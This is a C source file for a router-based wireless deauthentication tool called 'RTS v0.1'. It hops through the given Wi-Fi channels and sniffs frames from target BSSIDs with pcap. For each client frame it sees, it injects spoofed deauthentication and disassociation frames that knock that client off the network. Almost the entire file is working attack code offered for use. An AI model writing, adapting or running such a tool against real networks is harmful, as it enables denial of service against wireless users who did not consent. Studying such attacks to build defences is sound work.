#define _GNU_SOURCE
#include <net/if.h>
#include <linux/nl80211.h>
#include <stdio.h>
#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>


#define le_to_host16  le16toh
#define le_to_host32  le32toh
#define TWO_START 2412
#define FIVE_START 5160


struct ieee80211_radiotap_hdr {
  uint8_t it_version;
  uint8_t it_pad;
  uint16_t it_len;
  uint32_t it_present;
} __attribute__ ((packed));

struct ieee80211_mgmt {
  uint16_t frame_control;
  uint16_t duration;
  uint8_t ra[6];
  uint8_t ta[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
  uint8_t tag_id;
  uint8_t tag_len;
} __attribute__ ((packed));

static const uint8_t RADIOTAP_HDR[] = {
    0x00, 0x00, // version + padding
    0x18, 0x00,             // length 
    0x0f, 0x80, 0x00, 0x00, // bitmap
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
    0x00, // fcs
    0x02, // rate
    0x00, 0x00, 0x00, 0x00, // channel
    0x08, 0x00 // no-ack required
};

// GCC
// mipsel-openwrt-linux-musl-gcc -lnl-tiny -lpcap -I/home/ubuntu/openwrt_eap/staging_dir/target-mipsel_24kc_musl/usr/include/ -L/home/ubuntu/openwrt_eap/staging_dir/target-mipsel_24kc_musl/usr/lib/ -I/home/ubuntu/openwrt_eap/staging_dir/target-mipsel_24kc_musl/usr/include/libnl-tiny/ rts.c -o rts -O3 && mipsel-openwrt-linux-strip ./rts

static int error_handler(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg) {
  fprintf(stderr, "%s %d\n", strerror(-1 * err->error), -1 * err->error);
  return NL_STOP;
}

int set_channel(int channel, char* interface) {
    uint32_t freq = 0;
    if (channel >= 32) { 
        // wlan1 -> 5ghz
        freq = ((channel - 32) * 5) + FIVE_START;
    } else {
        freq = ((channel - 1) * 5) + TWO_START;
    }
    int err = 1;
    int rc;
    // socket + connect
    struct nl_sock* sk = nl_socket_alloc();
    genl_connect(sk);

    // message to set wifi
    struct nl_msg *mesg = nlmsg_alloc();
    enum nl80211_commands command = NL80211_CMD_SET_WIPHY;
    genlmsg_put(mesg, 0, 0, genl_ctrl_resolve(sk, "nl80211"), 0, 0, command, 0);

    
    int idx = if_nametoindex(interface);
    if (idx > 0) {
        fprintf(stderr, "Setting %s to channel %d (%d)\n", interface, channel, freq);
        struct nl_cb *cb = nl_cb_alloc(NL_CB_DEFAULT);
        NLA_PUT_U32(mesg, NL80211_ATTR_IFINDEX, idx);
        NLA_PUT_U32(mesg, NL80211_ATTR_WIPHY_FREQ, freq);
        NLA_PUT_U32(mesg, NL80211_ATTR_CHANNEL_WIDTH, NL80211_CHAN_WIDTH_20);
        nl_cb_err(cb, NL_CB_CUSTOM, error_handler, &err);
        rc = nl_send_auto_complete(sk, mesg);
        nl_recvmsgs(sk, cb);
        nl_cb_put(cb);
        nlmsg_free(mesg);
        nl_socket_free(sk);
        return (err >= 0);
    } else {
        fprintf(stderr, "Invalid wifi card %s\n", interface);
        return 2;
    }
    nla_put_failure:
        nlmsg_free(mesg);
        return 3;
}

int main(int argc, char** argv) {
    fprintf(stderr, "RTS v0.1\n");
    srand(time(NULL));
    if (argc < 3) {
        printf("Usage: %s <interface> <channels> <bssid1> <bssid2...>\n", argv[0]);
        return 1;
    }
    int five_ghz = strncmp("wlan1", argv[1], 5);
    
    // parse channels
    #define MAX_CHAN 4
    int c_channel = 0;
    int channels[MAX_CHAN] = {0};
    int n_channels = 0;
    char *iface_str = argv[1];
    char *token = strtok(argv[2], ",");
    while (token != NULL && n_channels < MAX_CHAN) {
        channels[n_channels] = strtol(token, NULL, 10);
        n_channels++;
        token = strtok(NULL, ",");
    }

    // print channels and set first channel
    if (n_channels == 0) {
        fprintf(stderr, "no channels defined\n");
        return 0;
    } else {
        fprintf(stdout, "working on channels: ");
        for (int i=0; i<n_channels; i++) {
            fprintf(stdout, "%d,", channels[i]);
        }
        fprintf(stdout, "\n");
    }
    set_channel(channels[0], iface_str);

    // set filter for bssids
    #define F_SIZE 1024
    char filter[F_SIZE];
    memset(filter, F_SIZE, 0);
    uint16_t offset = sprintf(filter, "wlan addr3 %s", argv[3]);
    for (int i=4; i<argc; i++) {
        offset += snprintf(filter+offset, F_SIZE-offset, " or wlan addr3 %s", argv[i]);
    }
    fprintf(stderr, "filter: %s\n", filter);

    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;

    pcap_t *iface = pcap_create(argv[1], errbuf);
    if (iface == NULL) {
        fprintf(stderr,"Error calling pcap_create\n");
        exit(1);
    }
    
    if (pcap_set_immediate_mode(iface, 1) != 0) {
        fprintf(stderr,"Error calling pcap_set_immediate_mode\n");
        exit(1);
    }
    
    if (pcap_activate(iface) != 0) {
        fprintf(stderr,"Error calling pcap_activate\n");
        exit(1);
    }
    
    if (pcap_compile(iface, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }
    if (pcap_setfilter(iface, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n"); 
        exit(1); 
    }
    if (pcap_setnonblock(iface, 1, errbuf) == -1) { 
        fprintf(stderr,"Error calling pcap_setnonblock\n"); 
        exit(1); 
    }
    
    if (pcap_set_buffer_size(iface, 8192) == -1) {
        fprintf(stderr,"Error setting buffer!\n"); 
        exit(1); 
    }
    
    int fd = pcap_fileno(iface);
    int sndbuf = 0;
    socklen_t optlen;
    if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, &optlen) == -1) {
        fprintf(stderr,"Error getting send buffer!\n"); 
        exit(1); 
    }
    fprintf(stderr, "modifying fd:%d, cbuf:%d\n", fd, sndbuf);
    sndbuf = 180224;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) == -1) {
        fprintf(stderr,"Error setting send buffer!\n"); 
        exit(1); 
    }
    
    if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, &optlen) == -1) {
        fprintf(stderr,"Error getting send buffer!\n"); 
        exit(1); 
    }
    fprintf(stderr, "sendfd:%d, cbuf:%d\n", fd, sndbuf);
    
    if (pcap_datalink(iface) != DLT_IEEE802_11_RADIO) { 
        fprintf(stderr, "Not a RADIOTAP!\n");
        exit(1);
    }

    struct pcap_pkthdr hdr;
    uint16_t ctr = 0;
    time_t seconds = time(NULL);

    while (1) {
        struct ieee80211_radiotap_hdr *rtap;
        struct ieee80211_mgmt *fr;
        uint16_t fc, type, subtype;
        if ((time(NULL) - seconds) > 1) {
            // change channel
            c_channel++;
            c_channel = c_channel % n_channels;
            set_channel(channels[c_channel], iface_str);
            seconds = time(NULL);
        }

        const unsigned char *packet = pcap_next(iface, &hdr);
        if (packet != NULL) {
            rtap = (struct ieee80211_radiotap_hdr *)packet;
            fr = (struct ieee80211_mgmt *)(packet + le_to_host16(rtap->it_len));

            fc = le_to_host16(fr->frame_control);
            type = (fc >> 2) & 0x0003;
            subtype = (fc >> 4) & 0x000f;

            // ignore beacons
            if (fr->ra[0] == 0xff) {
                continue;
            }
            // ignore stp (01:80:c2)
            if (fr->ra[0] == 0x01 && fr->ra[1] == 0x80 && fr->ra[2] == 0xc2) {
                continue;
            }

            char mac[18];
            snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", fr->ta[0], fr->ta[1], fr->ta[2], fr->ta[3], fr->ta[4], fr->ta[5]);
            printf("packet from ta:%s to ", mac);
            snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", fr->ra[0], fr->ra[1], fr->ra[2], fr->ra[3], fr->ra[4], fr->ra[5]);
            printf("ra:%s d:%d\n", mac, fr->duration);

            uint8_t pkt[256];
            memset(pkt, 0, 256);
            uint16_t size = 0;
            memcpy(pkt, RADIOTAP_HDR, sizeof(RADIOTAP_HDR));
            size += sizeof(RADIOTAP_HDR);
            struct ieee80211_mgmt *frame = (struct ieee80211_mgmt *)(pkt + size);
            size += sizeof(struct ieee80211_mgmt);
            if (rand() % 2 == 0) {
                frame->frame_control = 0xc0; // deauth
            } else {
                frame->frame_control = 0xa0; // disassoc
            }
            frame->duration = 0;
            for (int i=0; i<6; i++){ 
                 frame->ra[i] = fr->ra[i];
                 frame->ta[i] = fr->ta[i];
                 frame->bssid[i] = fr->ta[i];
            }
            frame->tag_len = 0x0;

            const int count = 5;
            printf("injecting %d x d:%d\n", count, size);
            for(int i=0; i<count; i++) {
                frame->tag_id = (rand() % 25) + 1;
                pcap_inject(iface, pkt, size);
            }
            
        }
        usleep(10);
    }
    pcap_close(iface);
    return 0;
}
